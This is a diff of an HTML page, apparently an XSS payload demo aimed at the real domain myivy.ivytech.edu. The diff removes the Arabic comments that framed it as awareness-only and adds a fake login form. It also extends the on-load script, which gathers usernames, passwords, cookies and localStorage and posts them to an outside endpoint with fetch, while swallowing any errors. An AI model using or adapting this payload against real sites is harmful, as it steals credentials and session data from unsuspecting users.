@@ -1,17 +1,23 @@
-<!-- ❌ كود خبيث يستخدمه مهاجم في موقع myivy.ivytech.edu عند وجود XSS -->
-<!-- للتوعية فقط. لا يجب استخدام هذا الكود خارج بيئة اختبار مرخص بها. -->
-<!DOCTYPE html>
-<html>
-<head><title>Malicious XSS on myivy.ivytech.edu</title></head>
 <body>
   <h2>Welcome to MyIvy (وهمي)</h2>
 
+  <!-- نموذج مزيف للتجربة -->
+  <form id="loginForm">
+    <input type="text" name="username" value="admin">
+    <input type="password" name="password" value="123456">
+    <input type="submit" value="Login">
+  </form>
+
   <script>
-    // السكربت يبدأ فور تحميل الصفحة - دون تفاعل المستخدم
     (function() {
       try {
+        const form = document.forms[0];
+
+        // جمع بيانات النموذج والبيئة
         const stolen = {
           source: "myivy.ivytech.edu",
+          username: form.username.value,
+          password: form.password.value,
           cookies: document.cookie,
           storage: {
             local: {...localStorage},
@@ -25,11 +31,9 @@
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify(stolen)
         });
-
       } catch (err) {
-        // فشل التنفيذ بصمت
+        // خطأ صامت
       }
     })();
   </script>
 </body>
-</html>
